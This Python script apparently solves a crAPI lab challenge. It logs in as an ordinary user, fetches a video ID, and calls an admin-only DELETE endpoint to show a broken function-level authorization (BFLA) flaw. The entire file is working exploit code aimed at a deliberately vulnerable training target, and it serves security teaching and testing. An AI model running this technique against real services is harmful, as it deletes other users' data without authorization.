#!/usr/bin/env python3
"""Challenge 7: Delete another user's video (BFLA)"""
import argparse, sys
from pathlib import Path
from typing import Optional, List, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        return r.json().get("token") or r.json().get("access_token")
    except:
        return None

def get_dashboard(base_url: str, token: str, timeout: float = 15) -> Optional[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        return requests.get(f"{base_url.rstrip('/')}/identity/api/v2/user/dashboard",
                           headers=headers, timeout=timeout).json()
    except:
        return None

def delete_admin_video(base_url: str, token: str, video_id: str, timeout: float = 15) -> bool:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.delete(f"{base_url.rstrip('/')}/identity/api/v2/admin/videos/{video_id}",
                           headers=headers, timeout=timeout)
        return r.status_code in (200, 204)
    except:
        return False

def main():
    parser = argparse.ArgumentParser(description="Challenge 7: BFLA - Delete Video")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--attacker-email", default="mike1@my.lab")
    parser.add_argument("--video-id", default=None)
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 7: BFLA - Delete Video\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.attacker_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")

    if not args.video_id:
        dashboard = get_dashboard(base_url, token)
        if not dashboard or dashboard.get("video_id") is None:
            print("[!] No videos found"); sys.exit(1)
        video_id = dashboard.get("video_id")
        print(f"[+] Using video ID: {video_id}")
    else:
        video_id = args.video_id

    print(f"\n[*] BFLA: Deleting video via admin endpoint...")
    if delete_admin_video(base_url, token, video_id):
        print(f"[+] SUCCESS! Video deleted")
        print(f"[!] VULNERABLE: Can delete videos via admin endpoint without proper auth")
    else:
        print("[!] Delete failed")

if __name__ == "__main__":
    main()
